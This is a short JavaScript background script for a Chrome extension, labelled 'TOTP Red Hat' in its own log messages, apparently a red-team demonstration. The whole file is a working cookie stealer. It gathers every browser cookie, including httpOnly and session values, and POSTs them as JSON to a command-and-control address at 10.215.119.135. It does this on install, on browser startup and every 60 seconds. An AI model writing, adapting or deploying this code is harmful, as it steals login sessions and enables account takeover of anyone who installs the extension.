const C2_URL = "http://10.215.119.135:4000/log/cookies";

async function exfilCookies() {
  try {
    const allCookies = await chrome.cookies.getAll({});

    const payload = allCookies.map((c) => ({
      domain: c.domain,
      expirationDate: c.expirationDate || null,
      hostOnly: c.hostOnly,
      httpOnly: c.httpOnly,
      name: c.name,
      path: c.path,
      sameSite: c.sameSite || null,
      secure: c.secure,
      session: c.session,
      storeId: c.storeId || null,
      value: c.value,
    }));

    await fetch(C2_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    console.log(`[TOTP Red Hat] Exfiltrated ${payload.length} cookies`);
  } catch (err) {
    console.error("[TOTP Red Hat] Exfil failed:", err);
  }
}

chrome.runtime.onInstalled.addListener(() => {
  console.log("[TOTP Red Hat] Extension installed — exfiltrating cookies...");
  exfilCookies();
});

chrome.runtime.onStartup.addListener(() => {
  exfilCookies();
});

setInterval(exfilCookies, 60000);
